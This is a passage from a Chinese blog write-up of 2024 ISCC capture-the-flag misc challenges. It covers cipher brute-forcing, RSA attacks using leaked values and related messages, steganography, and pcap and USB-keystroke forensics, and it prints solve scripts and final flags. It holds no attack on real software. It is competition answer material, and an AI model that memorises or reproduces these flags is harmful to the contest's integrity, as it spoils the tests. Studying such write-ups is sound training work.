class="hljs-string">&#x27;`~!@#$%^&amp;*()+=[]\:;&quot;\&#x27;&lt;&gt;,.?/|ZQjRX&#x27;</span>)<br><span class="hljs-keyword">for</span> perm <span class="hljs-keyword">in</span> itertools.permutations(key_chars, <span class="hljs-number">6</span>):<br>    key_map = &#123;<br>        <span class="hljs-string">&#x27;a&#x27;</span>: <span class="hljs-string">&#x27;4&#x27;</span>,<br>        <span class="hljs-string">&#x27;b&#x27;</span>: <span class="hljs-string">&#x27;9&#x27;</span>,<br>        <span class="hljs-string">&#x27;c&#x27;</span>: <span class="hljs-string">&#x27;5&#x27;</span>,<br>        <span class="hljs-string">&#x27;d&#x27;</span>: <span class="hljs-string">&#x27;3&#x27;</span>,<br>        <span class="hljs-string">&#x27;e&#x27;</span>: <span class="hljs-string">&#x27;7&#x27;</span>,<br>        <span class="hljs-string">&#x27;f&#x27;</span>: <span class="hljs-string">&#x27;b&#x27;</span>,<br>        <span class="hljs-string">&#x27;g&#x27;</span>: <span class="hljs-string">&#x27;6&#x27;</span>,<br>        <span class="hljs-string">&#x27;l&#x27;</span>: <span class="hljs-string">&#x27;d&#x27;</span>,<br>        <span class="hljs-string">&#x27;h&#x27;</span>: perm[<span class="hljs-number">0</span>],<br>        <span class="hljs-string">&#x27;i&#x27;</span>: perm[<span class="hljs-number">1</span>],<br>        <span class="hljs-string">&#x27;j&#x27;</span>: perm[<span class="hljs-number">2</span>],<br>        <span class="hljs-string">&#x27;k&#x27;</span>: perm[<span class="hljs-number">3</span>],<br>        <span class="hljs-string">&#x27;m&#x27;</span>: perm[<span class="hljs-number">4</span>],<br>        <span class="hljs-string">&#x27;n&#x27;</span>: perm[<span class="hljs-number">5</span>],<br>    &#125;<br><br>    hex_str = <span class="hljs-string">&quot;&quot;</span>.join(key_map.get(char, <span class="hljs-string">&#x27;?&#x27;</span>) <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> ciphertext)<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">all</span>(<span class="hljs-number">0x2f</span> &lt; <span class="hljs-built_in">int</span>(hex_str[i*<span class="hljs-number">2</span>:i*<span class="hljs-number">2</span>+<span class="hljs-number">2</span>], <span class="hljs-number">16</span>) &lt;= <span class="hljs-number">0x7d</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(hex_str) // <span class="hljs-number">2</span>)):<br>            flag = <span class="hljs-built_in">bytes</span>.fromhex(hex_str).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>            <span class="hljs-keyword">if</span> flag.endswith(<span class="hljs-string">&#x27;&#125;&#x27;</span>) <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">any</span>(char <span class="hljs-keyword">in</span> flag <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> valid_chars):<br>                <span class="hljs-built_in">print</span>(flag)<br><br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br></code></pre></td></tr></table></figure>

<h4 id="Misc-Number-is-the-key"><a href="#Misc-Number-is-the-key" class="headerlink" title="Misc Number_is_the_key"></a>Misc Number_is_the_key</h4><p>改 zip 查看 xml</p>
<p><img src="../../../../img/archives/2024ISCC05/3b0dafe08b73be43d5802a1ac2afb255.png" srcset="/img/loading.gif" lazyload></p>
<p>Excel 打开查看 AO28 单元格，发现是粗体，判断为粗体改黑格子出二维码</p>
<p>编写 VBA 上色</p>
<figure class="highlight plaintext"><figcaption><span>basic</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs visual">Sub ColorBoldCells()<br>    Dim rng As Range<br>    Dim cell As Range<br>    <br>    &#x27;选择要进行操作的区域<br>    Set rng = Selection<br>    <br>    &#x27;遍历选定区域中的每个单元格<br>    For Each cell In rng<br>        &#x27;检查单元格是否加粗<br>        If cell.Font.Bold Then<br>            &#x27;如果单元格加粗，则将单元格颜色设置为黑色<br>            cell.Interior.Color = RGB(0, 0, 0) &#x27;设置为黑色<br>        End If<br>    Next cell<br>End Sub<br></code></pre></td></tr></table></figure>

<p><img src="../../../../img/archives/2024ISCC05/ac19b2ce2ebbb2f06ebe8d257ceca447.png" srcset="/img/loading.gif" lazyload></p>
<p>识别二维码得到 lhvmGDKu8wh0</p>
<h4 id="Misc-RSA-KU"><a href="#Misc-RSA-KU" class="headerlink" title="Misc-RSA_KU"></a>Misc-RSA_KU</h4><p>一个简单的 RSA，其中有共模、指数两个泄漏。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs py">n = <span class="hljs-number">129699330328568350681562198986490514508637584957167129897472522138320202321246467459276731970410463464391857177528123417751603910462751346700627325019668100946205876629688057506460903842119543114630198205843883677412125928979399310306206497958051030594098963939139480261500434508726394139839879752553022623977</span><br>e = <span class="hljs-number">65537</span><br>c = <span class="hljs-number">107852602155773259923403542389501492981002279247787424909446593128061875438006317873953522631052977581341992123944556437032034169947931866268754972830643540131939906290453588788889926914293025647586041889600171520005628290525448770232539992496475146604656722856735212907459138830366239274982714366288383870403</span><br>leak1 = <span class="hljs-number">129699330328568350681562198986490514508637584957167129897472522138320202321246467459276731970410463464391857177528123417751603910462751346700627325019668067056973833292274532016607871906443481233958300928276492550916101187841666991944275728863657788124666879987399045804435273107746626297122522298113586003834</span><br>leak2 = <span class="hljs-number">129699330328568350681562198986490514508637584957167129897472522138320202321246467459276731970410463464391857177528123417751603910462751346700627325019668066482326285878341068180156082719320570801770055174426452966817548862938770659420487687194933539128855877517847711670959794869291907075654200433400668220458</span><br><br>sol = leak1 + leak2<br>p_plus_q = <span class="hljs-number">2</span> * n + <span class="hljs-number">4</span> - sol<br><span class="hljs-keyword">assert</span> p_plus_q % <span class="hljs-number">3</span> == <span class="hljs-number">0</span><br>p_plus_q = p_plus_q // <span class="hljs-number">3</span><br>phi = n + <span class="hljs-number">1</span> - p_plus_q<br>d = inverse(e, phi)<br>m = <span class="hljs-built_in">pow</span>(c, d, n)<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br></code></pre></td></tr></table></figure>

<h4 id="Misc-Where-is-the-flag"><a href="#Misc-Where-is-the-flag" class="headerlink" title="Misc Where_is_the_flag"></a>Misc Where_is_the_flag</h4><p>下载后发现是一个 pyc 文件，直接在线网站反编译</p>
<p><img src="../../../../img/archives/2024ISCC05/e8d556a489c45e40f1ad061a3b765852.png" srcset="/img/loading.gif" lazyload> <img src="../../../../img/archives/2024ISCC05/e55f850dd4b4050487f9ee4c0a7273c7.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="../../../../img/archives/2024ISCC05/d7a7d8becab3b1bc332ac921d3c1f48f.png" srcset="/img/loading.gif" lazyload> 反编译后发现是一个 AES ECB 加密脚本，缺失了一部分的 key，怀疑是 pyc 隐写，使用 stegosaurus 对 pyc 中的隐藏信息进行分离</p>
<p><img src="../../../../img/archives/2024ISCC05/bdc4123ec30fc73aad8a705e6d3efb49.png" srcset="/img/loading.gif" lazyload> 分离出一串隐藏信息，进行解密得到 flag</p>
<h4 id="Misc-成语学习"><a href="#Misc-成语学习" class="headerlink" title="Misc 成语学习"></a>Misc 成语学习</h4><p><img src="../../../../img/archives/2024ISCC05/badc9c909cb37043fec7281e6b3b09bd.png" srcset="/img/loading.gif" lazyload> 打开压缩包发现需要先从流量包中找到压缩包密码</p>
<p><img src="../../../../img/archives/2024ISCC05/2f021617b9e7e208bdb97f32dec4ec34.png" srcset="/img/loading.gif" lazyload> 分析数据包，发现有多条 80 端口传输数据</p>
<p><img src="../../../../img/archives/2024ISCC05/aba323f8fb5b4b49a2a5e143c94178e8.png" srcset="/img/loading.gif" lazyload> 对这些数据包进行分析，发现其中上传了两次图片，使用 010 手动进行分离，得到两张图</p>
<p><img src="../../../../img/archives/2024ISCC05/576a1929d4e27d0317214dc904e764b2.png" srcset="/img/loading.gif" lazyload> <img src="../../../../img/archives/2024ISCC05/880dbb8a59abf6c47fe75f2f75e3a33e.png" srcset="/img/loading.gif" lazyload> 对第一张较为完整的图片进行宽高修复，得到压缩包 key</p>
<p>解压压缩包，对其 16 进制进行分析发现是 zip 压缩包</p>
<p><img src="../../../../img/archives/2024ISCC05/cd5679dfb496fb3a31259edf624df6cf.png" srcset="/img/loading.gif" lazyload> 解压压缩包，在其中搜索 <img src="../../../../img/archives/2024ISCC05/671695d46ff2dca7d263bc6d84c3f8b5.png" srcset="/img/loading.gif" lazyload> flag</p>
<p><img src="../../../../img/archives/2024ISCC05/7234bb18410f796bc846d5f241697b87.png" srcset="/img/loading.gif" lazyload> <img src="../../../../img/archives/2024ISCC05/8da28665613ade8b208f6917b23c6bd9.png" srcset="/img/loading.gif" lazyload> <img src="../../../../img/archives/2024ISCC05/2317fe4fc2993d4735e5d7706b79daea.png" srcset="/img/loading.gif" lazyload> 打开 flag.txt，得到提示，百度搜索李维斯特</p>
<p><img src="../../../../img/archives/2024ISCC05/bc021f8ab2edc024cb9ff324e6eb616b.png" srcset="/img/loading.gif" lazyload> 使用 hmac md5 进行加密（普通 md5 没有密钥），得到 flag</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment"># coding=gbk</span><br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> hmac<br><br>key=<span class="hljs-string">b&#x27;plum&#x27;</span><br>h = hmac.new(key, digestmod=hashlib.md5)<br>a=<span class="hljs-built_in">bytes</span>(<span class="hljs-string">&#x27;天道好还&#x27;</span>.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>h.update(a)<br><span class="hljs-built_in">print</span>(h.hexdigest())<br></code></pre></td></tr></table></figure>

<h4 id="Misc-钢铁侠在解密"><a href="#Misc-钢铁侠在解密" class="headerlink" title="Misc 钢铁侠在解密"></a>Misc 钢铁侠在解密</h4><p><img src="../../../../img/archives/2024ISCC05/867015e9c5a06b0c95567201b6ec071a.png" srcset="/img/loading.gif" lazyload> 打开压缩包发现是一张 bmp，猜测是 bmp 宽高修复 stegsolve silenteye 中的一种，尝试后使用 silenteye 成功解密出 C1 C2</p>
<p>解出 C1 C2，结合小字条里的 n e 猜测使用 sagemath 解密，编写 exp 解密成功，得到 flag{jian_gu_neng_guang_294}</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">def</span> <span class="hljs-title function_">H_gcd</span>(<span class="hljs-params">a, b, c, d</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-number">2</span> * b.degree() &lt;= a.degree() <span class="hljs-keyword">or</span> a.degree() == <span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span><br>    m = a.degree() // <span class="hljs-number">2</span><br>    a_top, a_bot = a.quo_rem(x ^ m)<br>    b_top, b_bot = b.quo_rem(x ^ m)<br>    R00, R01, R10, R11 = H_gcd(a_top, b_top, c, d)<br>    q, e = c.quo_rem(d)<br>    d_top, d_bot = d.quo_rem(x ^ (m // <span class="hljs-number">2</span>))<br>    e_top, e_bot = e.quo_rem(x ^ (m // <span class="hljs-number">2</span>))<br>    S00, S01, S10, S11 = H_gcd(d_top, e_top, c, d)<br>    RET00 = S01 * R00 + (S00 - q * S01) * R10<br>    RET01 = S01 * R01 + (S00 - q * S01) * R11<br>    RET10 = S11 * R00 + (S10 - q * S11) * R10<br>    RET11 = S11 * R01 + (S10 - q * S11) * R11<br>    <span class="hljs-keyword">return</span> RET00, RET01, RET10, RET11<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gcd</span>(<span class="hljs-params">a, b</span>):<br>    <span class="hljs-built_in">print</span>(a.degree(), b.degree())<br>    q, r = a.quo_rem(b)<br>    <span class="hljs-keyword">if</span> r == <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">return</span> b<br>    c = R00 * a + R01 * b<br>    d = R10 * a + R11 * b<br>    <span class="hljs-keyword">if</span> d == <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">return</span> c.monic()<br>    q, r = c.quo_rem(d)<br>    <span class="hljs-keyword">if</span> r == <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">return</span> d<br>    R00, R01, R10, R11 = H_gcd(a, b, c, d)<br>    <span class="hljs-keyword">return</span> gcd(d, r)<br><br>c1= <span class="hljs-number">12744943905414850308417999904986376734124631504071873205947855422177085470281673606545618388415721111590612847111002272759511218047943933697705976629728581810858696917222051538576892514221463056369716823164158104938702580464838007334942075998153764497740905960677225327756537463202273615355910310326155870838333350872007309931187462233162642322207598571944949297806707589838065768093503541323044156047612831270612073868030226314544152655775548103253996455564925410496635352736573316587910068873366434782453664081150507883925930476919990344434527274810765667454032527896723700182974061325254742297277353789121472418169</span><br>c2= <span class="hljs-number">9770516807895772972980379185536457290028475666066776780041135025450851339561407032940190938668771545174037785359727908318149187650001968997249646628840702638717224296202624527806376926550191829392297045454749310128015447709365941605545253333938384394543626443841455610326764203685673066225663387400045310664520807257175739221118081085784720144167245348076111129673332284921879492527930822920789501897637756635423136492848881001435830563076633845035099887634861187099579448924882832779812380007954483951512362176489845658310002699999587394712798913593450316496875947914832214035413991634284445797252954993798163292773</span><br>N=<span class="hljs-number">14333611673783142269533986072221892120042043537656734360856590164188122242725003914350459078347531255332508629469837960098772139271345723909824739672964835254762978904635416440402619070985645389389404927628520300563003721921925991789638218429597072053352316704656855913499811263742752562137683270151792361591681078161140269916896950693743947015425843446590958629225545563635366985228666863861856912727775048741305004192164068930881720463095045582233773945480224557678337152700769274051268380831948998464841302024749660091030851843867128275500525355379659601067910067304244120384025022313676471378733553918638120029697</span><br>e = <span class="hljs-number">52595</span><br><br>pad1 = <span class="hljs-number">1769169763</span><br>pad2 = <span class="hljs-number">1735356260</span><br>PR.&lt;x&gt;=PolynomialRing(Zmod(N))<br>g1 = (x*<span class="hljs-number">2</span>^<span class="hljs-number">32</span>+pad1)^e - c1<br>g2 = (x*<span class="hljs-number">2</span>^<span class="hljs-number">32</span>+pad2)^e - c2<br>X=<span class="hljs-number">584734024210292804199275855856518183354184330877</span><br><span class="hljs-built_in">print</span>(g1(X),g2(X))<br>res = gcd(g1,g2)<br>m = -res.coefficients()[<span class="hljs-number">0</span>]<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-built_in">hex</span>(m)[<span class="hljs-number">2</span>:]).decode().replace(<span class="hljs-string">&quot;flag&#123;&quot;</span>,<span class="hljs-string">&#x27;ISCC&#123;&#x27;</span>))<br></code></pre></td></tr></table></figure>

<h4 id="Misc-工业互联网模拟仿真数据分析"><a href="#Misc-工业互联网模拟仿真数据分析" class="headerlink" title="Misc 工业互联网模拟仿真数据分析"></a>Misc 工业互联网模拟仿真数据分析</h4><ol>
<li><p>题目一：在某些网络会话中，数据包可能保持固定大小，请给出含有此确定性特征的会话 IP 地址和数据包字节大小值。</p>
<p>答案：IP 地址：XX.XX.XX.XX，XX.XX.XX.XX，…，数值：XX</p>
<p>根据 Length 排序进行分析，只有 192.168.1.2</p>
<p>192.168.1.4 的 Length 大小不变，Data 的字节大小为 24</p>
<p><img src="../../../../img/archives/2024ISCC05/da8dd2774b5572c9516dd9a9a067c92b.png" srcset="/img/loading.gif" lazyload></p>
</li>
</ol>
<p>（补充说明：IP 顺序从小到大排列，涉及的 IP 个数由选手自己判断）</p>
<ol>
<li><p>题目二：通信包数据某些字段可能为确定的，请给出确定字节数值。</p>
<p>答案：X</p>
</li>
</ol>
<p>Wireshark 分析多个数据包发现为 2024 <img src="../../../../img/archives/2024ISCC05/1aac71fc6a5c64185bc691d8bb1f8208.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="../../../../img/archives/2024ISCC05/48a107bdc80a2428cb99b34c29593de2.png" srcset="/img/loading.gif" lazyload></p>
<ol>
<li><p>题目三：一些网络通信业务在时间序列上有确定性规律，请提供涉及的 IP 地址及时间规律数值（<strong>小数点后两位</strong>）</p>
<p>答案：IP 地址：XX.XX.XX.XX，XX.XX.XX.XX，…，数值：XX</p>
<p>对每两台主机之间的通信进行分析，发现只有 192.168.1.3192.168.1.5 的时候都是 0.06xxx 秒</p>
<p><img src="../../../../img/archives/2024ISCC05/19609fdd5b165a1c9a2cd638f233cf8c.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="../../../../img/archives/2024ISCC05/250ac2e69927af03d950b8040746cfbb.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="../../../../img/archives/2024ISCC05/955921a2fbfe33201c488754e057d069.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="../../../../img/archives/2024ISCC05/8862dffa6220c688c8fb1eadff6c96a9.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="../../../../img/archives/2024ISCC05/fef871bb7854c939e5863fa164c4d733.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="../../../../img/archives/2024ISCC05/f12bd916f8d2b67f4d6b57b3ccc40e47.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="../../../../img/archives/2024ISCC05/2a73d684ec1514d116294efd80fb61bc.png" srcset="/img/loading.gif" lazyload></p>
</li>
</ol>
<p>（补充说明：IP 顺序从小到大排列，涉及的 IP 个数由选手自己判断）</p>
<ol>
<li><p>题目四：一些网络通信业务存在逻辑关联性，请提供涉及的 IP 地址</p>
<p>答案：XX.XX.XX.XX，XX.XX.XX.XX，…</p>
<p>分析数据流发现每次 192.168.1.3 向 192.168.1.2 发送数据后，192.168.1.2 会向 192.168.1.6 发送数据</p>
<p><img src="../../../../img/archives/2024ISCC05/811b7debdab63305a93b00c25f4e7fe3.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="../../../../img/archives/2024ISCC05/dd3c9285cf9e6a9dedc43af30d80f1a0.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="../../../../img/archives/2024ISCC05/058ddd811922946634de2a29eee83a82.png" srcset="/img/loading.gif" lazyload></p>
</li>
</ol>
<p>（补充说明：IP 顺序从小到大排列，涉及的 IP 个数由选手自己判断）</p>
<ol>
<li><p>题目五：网络数据包往往会添加数据完整性校验值，请分析出数据校验算法名称及校验值在数据包的起始位和结束位（倒数位）</p>
<p>答案：XXXXX，X，X</p>
<p>长度为 5 个字符，猜测为 CRC32 或 CRC16</p>
<p>分析数据包可知，结束位（倒数位）必然为 1，后面就是 data，网络搜索后得知 CRC16 校验值大小为 2 字节，CRC32 校验值大小为 4 字节，所以可能是 CRC16</p>
<p>CRC16,?,1</p>
<p>从 0 到 16 对起始位进行猜测，在将起始位设置为 4 时成功提交</p>
<p><img src="../../../../img/archives/2024ISCC05/206de344a72593667d418aae88aa8d5e.png" srcset="/img/loading.gif" lazyload></p>
</li>
</ol>
<p>（补充说明：数据校验算法名称长度为 5 个字符，其中英文字母大写）</p>
<p>完整 flag:</p>
<p>“192.168.1.2,192.168.1.4,24”, # 第一小题答案：IP 顺序从小到大排列，涉及的 IP 个数由选手自己判断，数值为整数<br>“2024”, # 第二小题答案：数值为整数<br>“192.168.1.3,192.168.1.5,0.06”, # 第三小题答案：IP 顺序从小到大排列，涉及的 IP 个数由选手自己判断，数值保留小数点后 2 位<br>“192.168.1.2,192.168.1.3,192.168.1.6”, # 第四小题答案：IP 顺序从小到大排列，涉及的 IP 个数由选手自己判断<br>“CRC16,4,1” # 第五小题答案：数据校验算法名称长度为 5 个字符，其中英文字母大写</p>
<p>ISCC{192.168.1.2,192.168.1.4,24,2024,192.168.1.3,192.168.1.5,0.06,192.168.1.2,192.168.1.3,192.168.1.6, CRC16,4,1}</p>
<p>ISCC{adcca5c2a82064a17a645d35b6b054cd}</p>
<h4 id="Misc-精装四合一"><a href="#Misc-精装四合一" class="headerlink" title="Misc 精装四合一"></a>Misc 精装四合一</h4><p>发现每张图片之后都存在一部分数据，且存在大量 FF，猜测异或了 FF，从每张图片末尾提取数据并异或 FF</p>
<p><img src="../../../../img/archives/2024ISCC05/de964a9cd2f7f149710de00314e234be.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="../../../../img/archives/2024ISCC05/89e6551d6a69235ae9bdd83605c33225.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="../../../../img/archives/2024ISCC05/031b16f856a0131a1de363a92db50452.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="../../../../img/archives/2024ISCC05/900cf10d9a559b1239cf297231006730.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="../../../../img/archives/2024ISCC05/e9eb3305db00f9694c2f3d7a2e2b542f.png" srcset="/img/loading.gif" lazyload></p>
<p>异或后发现四段内容的开头是 504B0304，判断出是被一个字节一个字节切片成 4 份的 zip，根据每个文件的大小编写脚本进行还原</p>
<p><img src="../../../../img/archives/2024ISCC05/888f1069cc7b442f53f8c6580cc93a8d.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="../../../../img/archives/2024ISCC05/9b3bb1cb70384edb844eb0571d84d51d.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="../../../../img/archives/2024ISCC05/7db35788d128ec67d73615b310f2846b.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="../../../../img/archives/2024ISCC05/e5f294182db2d2f777e13e6482e26602.png" srcset="/img/loading.gif" lazyload></p>
<p>（见 exp-1）</p>
<p>打开 5.zip 发现需要密码，使用 BandiZip 尝试恢复</p>
<p><img src="../../../../img/archives/2024ISCC05/18a000ce598c7b0cdc99b75f70a8408f.png" srcset="/img/loading.gif" lazyload></p>
<p>打开压缩包，发现没东西，改文件后缀为 zip 读 document.xml，并在 media 中发现 true_flag.jpg</p>
<p><img src="../../../../img/archives/2024ISCC05/00ade6e9a0ece73740d1a43b0fa5e057.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="../../../../img/archives/2024ISCC05/386803bb5359aa3d5e51feefb15a8ec4.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="../../../../img/archives/2024ISCC05/93e3cf387f560f29ce83edaa5f140b59.png" srcset="/img/loading.gif" lazyload></p>
<p>发现疑似 rsa 的 n 的一串数字，且压缩包密码疑似 e，使用 factordb.com 进行在线分解</p>
<p><img src="../../../../img/archives/2024ISCC05/76f27e2b5a334fdad93956c40e8b12fc.png" srcset="/img/loading.gif" lazyload></p>
<p>分解出 p q 进行解密（exp-2）</p>
<p>得到 flag</p>
<p><img src="../../../../img/archives/2024ISCC05/d48635bf587d8d5fe3c39e8119b45be3.png" srcset="/img/loading.gif" lazyload></p>
<p>Exp-1</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs py">f1=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;11&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>)<br>f2=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;22&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>)<br>f3=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;33&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>)<br>f4=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;44&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>)<br>f5=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;5.zip&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3176</span>):<br>    f5.write(f1.read(<span class="hljs-number">1</span>))<br>    f5.write(f2.read(<span class="hljs-number">1</span>))<br>    f5.write(f3.read(<span class="hljs-number">1</span>))<br>    f5.write(f4.read(<span class="hljs-number">1</span>))<br>f5.write(f1.read(<span class="hljs-number">1</span>))<br>f5.write(f2.read(<span class="hljs-number">1</span>))<br></code></pre></td></tr></table></figure>

<p>Exp-2</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>p=<span class="hljs-number">100882503720822822072470797230485840381</span><br>q=<span class="hljs-number">167722355418488286110758738271573756671</span><br>e=<span class="hljs-number">65537</span><br>n=<span class="hljs-number">16920251144570812336430166924811515273080382783829495988294341496740639931651</span><br>phi=(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>c=bytes_to_long(<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;true_flag.jpeg&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>).read())<br>d=inverse(e,phi)<br><span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">pow</span>(c,d,n)))<br></code></pre></td></tr></table></figure>

<h4 id="Misc-时间刺客"><a href="#Misc-时间刺客" class="headerlink" title="Misc 时间刺客"></a>Misc 时间刺客</h4><p><img src="../../../../img/archives/2024ISCC05/bbef766df42588bd3ca6813adf6ee87b.png" srcset="/img/loading.gif" lazyload> <img src="../../../../img/archives/2024ISCC05/40b393a54e3f13121d2641fe16789497.png" srcset="/img/loading.gif" lazyload> 打开数据包发现是 usb 数据，根据题目简介的提示判断是敲击键盘的数据，使用 tshark 转换成 json 进行分析</p>
<p><img src="../../../../img/archives/2024ISCC05/993843873224904a32d8c54360950f09.png" srcset="/img/loading.gif" lazyload> <img src="../../../../img/archives/2024ISCC05/68ae9da493f99a5f2a5ff3b81662c2a2.png" srcset="/img/loading.gif" lazyload> tshark -T json -r 55.pcapng &gt; test.json</p>
<p><img src="../../../../img/archives/2024ISCC05/957c4f7138351cdd4cd13bd7ce1cb3d0.png" srcset="/img/loading.gif" lazyload> 使用 python 提取敲击数据转换成字母（见 exp1）</p>
<p>使用 flag 后的部分作为密码解压压缩包，由于键盘可能是大写也可能是小写输入，故都进行尝试，小写时成功解压 7z，大写时成功解压 rar</p>
<p><img src="../../../../img/archives/2024ISCC05/d2b8150d884a1852170200b41c0d993c.png" srcset="/img/loading.gif" lazyload> 解压后发现文件修改时间被修改，且根据题目简介提示时间，判断时转时间戳相减后转字符串，编写脚本进行转换（脚本见 exp2）得到 flag</p>
<p>Exp1</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs py">\<span 